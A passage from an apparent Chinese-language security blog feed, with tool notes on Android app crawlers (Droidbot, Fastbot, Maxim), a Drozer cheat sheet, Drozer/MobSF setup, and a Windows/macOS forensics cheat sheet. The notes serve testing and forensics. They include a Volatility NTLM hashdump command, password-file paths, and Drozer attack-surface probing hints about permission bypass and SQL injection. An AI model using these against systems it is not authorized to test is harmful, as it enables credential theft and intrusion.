&lt;p>:::spoiler 實作&lt;/p></description></item><item><title>Droidbot</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/droidbot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/droidbot/</guid><description>&lt;h1 id="droidbot">
 Droidbot
 &lt;a class="anchor" href="#droidbot">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://github.com/honeynet/droidbot">Official Github Repo&lt;/a>其實也說明得非常清楚，但在初次執行的時候可能會出現以下問題，按照&lt;a href="https://juejin.cn/post/7316582773434204171"> APP自動化全站爬取探索 &lt;/a>，只要修改&lt;code>./droidbot/app.py&lt;/code>的line 28就可以了
:::spoiler Execution Problem&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ droidbot -a ./base.apk/Mattermost.apk -grant_perm -script ./my_pass_login_script.json -keep_app
INFO:Device:disable minicap on sdk &amp;gt;= 32
Traceback (most recent call last):
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 96, in __init__
 self.app = App(app_path, output_dir=self.output_dir)
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\app.py&amp;#34;, line 28, in __init__
 from androguard.core.bytecodes.apk import APK
ModuleNotFoundError: No module named &amp;#39;androguard.core.bytecodes&amp;#39;
[CONNECTION] ADB is disconnected
WARNING:DroidBotIme:Failed to disconnect DroidBotIME!
Traceback (most recent call last):
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 96, in __init__
 self.app = App(app_path, output_dir=self.output_dir)
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\app.py&amp;#34;, line 28, in __init__
 from androguard.core.bytecodes.apk import APK
ModuleNotFoundError: No module named &amp;#39;androguard.core.bytecodes&amp;#39;

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
 File &amp;#34;\\?\C:\Users\berni\anaconda3\envs\mitmproxy\Scripts\droidbot-script.py&amp;#34;, line 33, in &amp;lt;module&amp;gt;
 sys.exit(load_entry_point(&amp;#39;droidbot&amp;#39;, &amp;#39;console_scripts&amp;#39;, &amp;#39;droidbot&amp;#39;)())
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\start.py&amp;#34;, line 145, in main
 droidbot = DroidBot(
 ^^^^^^^^^
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 116, in __init__
 self.stop()
 File &amp;#34;d:\ntu\thesis\mitm framework\code\appcrawler\droidbot\droidbot\droidbot.py&amp;#34;, line 191, in stop
 if hasattr(self.input_manager.policy, &amp;#34;master&amp;#34;) and \
 ^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: &amp;#39;NoneType&amp;#39; object has no attribute &amp;#39;policy&amp;#39;
&lt;/code>&lt;/pre>&lt;p>:::
&lt;img src="https://hackmd.io/_uploads/HJwvucL2A.png" alt="image" />&lt;/p></description></item><item><title>Drozer Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/drozer-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/drozer-cheat-sheet/</guid><description>&lt;h1 id="drozer-cheat-sheet">
 Drozer Cheat Sheet
 &lt;a class="anchor" href="#drozer-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="basic-console">
 Basic Console
 &lt;a class="anchor" href="#basic-console">#&lt;/a>
&lt;/h2>
&lt;p>基本上最常用的command就是&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run &amp;lt;drozer module&amp;gt; &amp;lt;optional object&amp;gt; # 啟動內建的module做到依稀操作
dz&amp;gt; help &amp;lt;drozer module&amp;gt; # 查看該module的說明以及參數設定
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">dz&amp;gt; run app.package.list #列出所有已安裝的app package
dz&amp;gt; run app.package.list -f &amp;lt;key word&amp;gt; #列出特定的app package 
dz&amp;gt; run app.package.info -a &amp;lt;app package name&amp;gt; # 列出該app的基本訊息
dz&amp;gt; run app.package.manifest &amp;lt;app package name e.g. jakhar.aseem.diva&amp;gt; # 查看AndroidManifest.xml的資訊
dz&amp;gt; run app.package.attacksurface &amp;lt;app package name e.g. com.mwr.example.sieve&amp;gt; # 查看該app有什麼攻擊面
Attack Surface:
 3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限
 0 broadcast receivers exported
 2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal
 2 services exported
 is debuggable
&lt;/code>&lt;/pre>&lt;p>接著根據得到的資訊看要用以下哪一種的攻擊模式&lt;/p></description></item><item><title>Drozer/MobSF Installation</title><link>https://bernie6401.github.io/tools/others/android-related/installation/drozer_mobsf-installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/installation/drozer_mobsf-installation/</guid><description>&lt;h1 id="drozermobsf-installation">
 Drozer/MobSF Installation
 &lt;a class="anchor" href="#drozermobsf-installation">#&lt;/a>
&lt;/h1>
&lt;h2 id="installation---drozer">
 Installation - Drozer
 &lt;a class="anchor" href="#installation---drozer">#&lt;/a>
&lt;/h2>
&lt;p>我是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>的說明，但其實參考官網的也可以，我是用docker裝&lt;/p>
&lt;ol>
&lt;li>Download drozer-agent &amp;amp; Install - &lt;a href="https://github.com/WithSecureLabs/drozer-agent/releases">Download&lt;/a>
這是要安裝在手機測試端的類似一個server的概念，而我們的電腦端也要安裝類似的東西(有好幾種方式，我是用Docker)，讓電腦和手機可以互通
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb install drozer-agent.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Start a Session
打開agent app會發現右下角有一個Off，點擊後會變成On，代表這個agent已經準備好要和電腦這邊的server連接
![Screenshot_20240603-131808](&lt;a href="https://hackmd.io/_uploads/SkPEfC9NC.png">https://hackmd.io/_uploads/SkPEfC9NC.png&lt;/a> =200x)&lt;/li>
&lt;li>設定電腦的Port轉發到Android的某個Port
根據&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>的說明，以及官網的要求，我們必須要把電腦31415這個port的封包轉發到手機端的31415這個port
&lt;blockquote>
&lt;p>Android 的 adb forward 通訊埠轉發的功能，adb forward 的功能是轉發 PC 電腦上某個埠號 (port) 資料到 Android 裝置的某個埠號 (port)，例如：下列 adb forward 指令就是將 PC 端的 port 10000 收到的資料，轉發給到 Android Device 的 port 20000&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb forward tcp:31415 tcp:31415
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Install PC Drozer Client
看到以下畫面就代表成功了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker run -it --add-host host.docker.internal:host-gateway withsecurelabs/drozer console connect --server host.docker.internal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Selecting ff762fc058e91df3 &lt;span style="color:#f92672">(&lt;/span>Google Pixel 6a 13&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .. ..:.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..o.. .r..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..a.. . ....... . ..nd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ro..idsnemesisand..pr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .otectorandroidsneme.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .,sisandprotectorandroids+.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..nemesisandprotectorandroidsn:.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .emesisandprotectorandroidsnemes..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ..isandp,..,rotecyayandro,..,idsnem.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .isisandp..rotectorandroid..snemisis.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ,andprotectorandroidsnemisisandprotec.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .torandroidsnemesisandprotectorandroid.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .snemisisandprotectorandroidsnemesisan:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .dprotectorandroidsnemesisandprotector.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drozer Console &lt;span style="color:#f92672">(&lt;/span>v3.0.2&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="installation---mobsf">
 Installation - MobSF
 &lt;a class="anchor" href="#installation---mobsf">#&lt;/a>
&lt;/h2>
&lt;p>可以直接使用&lt;a href="https://mobsf.live/">線上的工具&lt;/a>，也可以用docker架在自己的電腦&lt;/p></description></item><item><title>Fastbot Android</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/fastbot-android/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/fastbot-android/</guid><description>&lt;h1 id="fastbot-android">
 Fastbot Android
 &lt;a class="anchor" href="#fastbot-android">#&lt;/a>
&lt;/h1>
&lt;p>以下流程皆是參考&lt;a href="https://blog.csdn.net/u010698107/article/details/127347704">CSDN-Android APP穩定性測試工具Fastbot&lt;/a>和&lt;a href="https://github.com/bytedance/Fastbot_Android/blob/main/handbook-cn.md">官方中文教學&lt;/a>&lt;/p>
&lt;h2 id="一般使用">
 一般使用
 &lt;a class="anchor" href="#%e4%b8%80%e8%88%ac%e4%bd%bf%e7%94%a8">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>把repo clone下來，並且把一些檔案複製到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/bytedance/Fastbot_Android.git
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd Fastbot_Android
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push fastbot-thirdpart.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push framework.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push monkeyq.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push libs/. /data/local/tmp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>dump apk內部會使用到的strings，並且複製到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aapt2 dump strings &amp;lt;your apk name&amp;gt; &amp;gt; max.valid.strings
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push max.valid.strings /sdcard 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>獲取device number和package name
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb devices
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>List of devices attached
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>24121JEGR04513 device
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ aapt2 dump badging &lt;span style="color:#e6db74">&amp;#34;Spotify_ Music and Podcasts_8.9.60.560_APKPure.apk&amp;#34;&lt;/span> | findstr &lt;span style="color:#e6db74">&amp;#34;package&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>package: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.spotify.music&amp;#39;&lt;/span> versionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;116920144&amp;#39;&lt;/span> versionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;8.9.60.560&amp;#39;&lt;/span> platformBuildVersionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span> platformBuildVersionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersion&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersionCodename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uses-permission: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.sec.android.app.clockpackage.permission.READ_ALARM&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>實際測試
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell CLASSPATH&lt;span style="color:#f92672">=&lt;/span>/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p &amp;lt;package name&amp;gt; --agent reuseq --running-minutes &amp;lt;遍歷時長&amp;gt; --throttle &amp;lt;事件頻率&amp;gt; -v -v
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb shell CLASSPATH&lt;span style="color:#f92672">=&lt;/span>/sdcard/monkeyq.jar:/sdcard/framework.jar:/sdcard/fastbot-thirdpart.jar exec app_process /system/bin com.android.commands.monkey.Monkey -p com.spotify.music --agent reuseq --running-minutes &lt;span style="color:#ae81ff">1&lt;/span> --throttle &lt;span style="color:#ae81ff">500&lt;/span> -v -v --output-directory /sdcard/fastbot_results&amp;amp;adb pull /sdcard/fastbot_results D:&lt;span style="color:#ae81ff">\D&lt;/span>ownloads
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="輸入自訂strings">
 輸入自訂Strings
 &lt;a class="anchor" href="#%e8%bc%b8%e5%85%a5%e8%87%aa%e8%a8%82strings">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Download ADBKeyBoard，安裝後設定預設keyboard為ADBKeyboard
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/senzhk/ADBKeyBoard/raw/master/ADBKeyboard.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb install ADBKeyboard.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb shell ime enable com.android.adbkeyboard/.AdbIME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb shell ime set com.android.adbkeyboard/.AdbIME
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>設定config並push到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;max.randomPickFromStringList = true&amp;#34;&lt;/span> &amp;gt; max.config
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push max.config /sdcard
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>設定像要輸入的strings並push到手機
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;test string&amp;#34;&lt;/span> &amp;gt; max.strings
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push max.strings /sdcard
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>:::info&lt;/p></description></item><item><title>Forensics Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/forensics-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/forensics-cheat-sheet/</guid><description>&lt;h1 id="forensics-cheat-sheet">
 Forensics Cheat Sheet
 &lt;a class="anchor" href="#forensics-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="windows">
 Windows
 &lt;a class="anchor" href="#windows">#&lt;/a>
&lt;/h2>
&lt;h3 id="where">
 Where
 &lt;a class="anchor" href="#where">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>SOFTWARE: &lt;code>root/Windows/System32/config/SOFTWARE&lt;/code>&lt;/li>
&lt;li>SYSTEM: &lt;code>root/Windows/System32/config/SYSTEM&lt;/code>&lt;/li>
&lt;li>NTUSER.DAT: &lt;code>root/Users/{username}/NTUSER.DAT&lt;/code>&lt;/li>
&lt;li>$MFT: &lt;code>root/$MFT&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="software-information">
 SOFTWARE Information
 &lt;a class="anchor" href="#software-information">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>原本電腦OS的基本資訊(Build Number/Product Name/):
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion&lt;/code>&lt;/li>
&lt;li>檢查SID:
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList&lt;/code>&lt;/li>
&lt;li>查看登入:
&lt;code>SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon&lt;/code>&lt;/li>
&lt;li>StartUp Run:
&lt;code>SOFTWARE/Microsoft/Windows/CurrentVersion/Run&lt;/code>&lt;/li>
&lt;/ul>
&lt;h4 id="ntuserdat每個使用者都不一樣">
 NTUSER.DAT(每個使用者都不一樣)
 &lt;a class="anchor" href="#ntuserdat%e6%af%8f%e5%80%8b%e4%bd%bf%e7%94%a8%e8%80%85%e9%83%bd%e4%b8%8d%e4%b8%80%e6%a8%a3">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>UserAssit:
&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist&lt;/code>&lt;/li>
&lt;li>Recent Docs:
&lt;code>root/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="system-information">
 System Information
 &lt;a class="anchor" href="#system-information">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>電腦名稱:
&lt;code>SYSTEM/ControlSet001/Control/ComputerName/ComputerName&lt;/code>&lt;/li>
&lt;li>電腦IP/DHCP相關資訊:
&lt;code>SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/&lt;/code>&lt;/li>
&lt;li>時區:
&lt;code>SYSTEM/ControlSet001/Control/TimeZoneInformation&lt;/code>&lt;/li>
&lt;li>USB資訊:
&lt;code>SYSTEM/ControlSet001/Enum/USBSTOR/&lt;/code>&lt;/li>
&lt;li>CPU架構:
&lt;code>SYSTEM/ControlSet001/Control/Session Manager/Environment/&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="database">
 Database
 &lt;a class="anchor" href="#database">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Chrome History:
&lt;code>./Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History&lt;/code>&lt;/li>
&lt;li>Firefox History:
&lt;code>./Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/{random}.default-release/places.sqlite&lt;/code>&lt;/li>
&lt;li>Skype Chat History:
&lt;code>./Users/{username}/AppData/Roaming/Skype/{account name}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="taskbar">
 Taskbar
 &lt;a class="anchor" href="#taskbar">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;code>./Users/{username}/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="mac-os">
 mac-OS
 &lt;a class="anchor" href="#mac-os">#&lt;/a>
&lt;/h2>
&lt;h3 id="plist">
 plist
 &lt;a class="anchor" href="#plist">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install libplist-utils -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ plistutil -i &lt;span style="color:#f92672">{&lt;/span>plist file&lt;span style="color:#f92672">}&lt;/span> -o &lt;span style="color:#f92672">{&lt;/span>output file&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>System Version:
&lt;code>./root/System/Library/CoreServices/SystemVersion.plist&lt;/code>&lt;/li>
&lt;li>Browser Bookmark
&lt;code>./root/Users/{username}/Library/Safari/Bookmarks.plist&lt;/code>&lt;/li>
&lt;li>Password information
&lt;code>./root/private/var/db/dslocal/nodes/Default/users/{username}.plist&lt;/code>&lt;/li>
&lt;li>The process responsible for connecting iPhones/iPads with MacOS is lockdown
&lt;code>./root/private/var/db/dslocal/nodes/Default/users/_usbmux.plist&lt;/code>&lt;/li>
&lt;li>Spotlight(這個不需要透過plistutil就可以直接cat)
&lt;code>./root/Users/{username}/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="event-log">
 Event Log
 &lt;a class="anchor" href="#event-log">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>短期檔案系統變更儲存在&lt;code>.fseventsd&lt;/code>中，必須使用&lt;code>mac_apt&lt;/code>這個工具幫忙parse(FSEVENTS)
&lt;code>./root/.fseventsd/&lt;/code>&lt;/li>
&lt;li>ScreenTime: 一樣要透過&lt;code>mac_apt&lt;/code>幫忙parse(SCREENTIME)，記得要把&lt;code>RMAdminStore-Local.sqlite-wal&lt;/code>這個檔案和&lt;code>RMAdminStore-Local.sqlite&lt;/code>放在一起執行
&lt;code>./root/private/var/folders/bf/{random strings}/0/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="database-1">
 Database
 &lt;a class="anchor" href="#database-1">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Note
&lt;code>./root/Users/{username}/Library/Group Containers/group.com.apple.notes&lt;/code>&lt;/li>
&lt;li>Quarantined Events
&lt;code>./root/Users/{username}/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2&lt;/code>&lt;/li>
&lt;li>Messages
&lt;code>./root/Users/{username}/Library/Messages/chat.db&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="volatilitys">
 Volatilitys
 &lt;a class="anchor" href="#volatilitys">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">主要的CheatSheet&lt;/a>&lt;/li>
&lt;li>ldrmodules: 更進階的dlllist，可以顯示被隱藏的dll，以及dll的狀態
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} ldrmodules --pid {pid}&lt;/code>&lt;/li>
&lt;li>如果要dump被injected過的process:
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} malfind --pid {pid} --dump-dir={output folder}&lt;/code>&lt;/li>
&lt;li>dump hash
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} hashdump &amp;gt; ntlm.hash&lt;/code>&lt;/li>
&lt;li>如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} timeliner &lt;/code>&lt;/li>
&lt;li>查看網路連線紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} netscan&lt;/code>&lt;/li>
&lt;li>在memory中用yarascan去search不同的pattern
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} yarascan -Y &amp;quot;example strings&amp;quot;&lt;/code>&lt;/li>
&lt;li>console中的command紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} consoles&lt;/code>&lt;/li>
&lt;li>查看iexplorer的紀錄
&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} iehistory&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>Maxim</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/maxim/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/maxim/</guid><description>&lt;h1 id="maxim">
 Maxim
 &lt;a class="anchor" href="#maxim">#&lt;/a>
&lt;/h1>
&lt;p>原本的&lt;a href="https://github.com/zhangzhao4444/Maxim">repo README&lt;/a>就說明的很清楚了&lt;/p>
&lt;h2 id="how-to-use">
 How to use
 &lt;a class="anchor" href="#how-to-use">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Environment
&lt;ul>
&lt;li>適用Emulator/Physical Android Version 7, 8, 9, 10, 11，但再往上就會遇到下面的問題&lt;/li>
&lt;li>待測的App需要先安裝&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Push File to Mobile
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb push framework.jar /sdcard
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ adb push monkey.jar /sdcard
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Command
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ adb shell CLASSPATH=/sdcard/monkey.jar:/sdcard/framework.jar exec app_process /system/bin tv.panda.test.monkey.Monkey -p &amp;lt;app package name&amp;gt; --uiautomatormix --running-minutes 1 -v -v
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Mode: &lt;code>--uiautomatormix&lt;/code>, &lt;code>--uiautomatordfs&lt;/code>, &lt;code>--uiautomatortroy&lt;/code>&lt;/li>
&lt;li>&lt;code>-p&lt;/code>: 需要更改成待測app的package name&lt;/li>
&lt;li>&lt;code>--running-minutes&lt;/code>: 設定要跑多久&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="problem">
 Problem
 &lt;a class="anchor" href="#problem">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>[Maxim] *** ERROR // CRASH: com.xueqiu.android (pid 6940)
[Maxim] *** ERROR // Short Msg: java.lang.UnsatisfiedLinkError
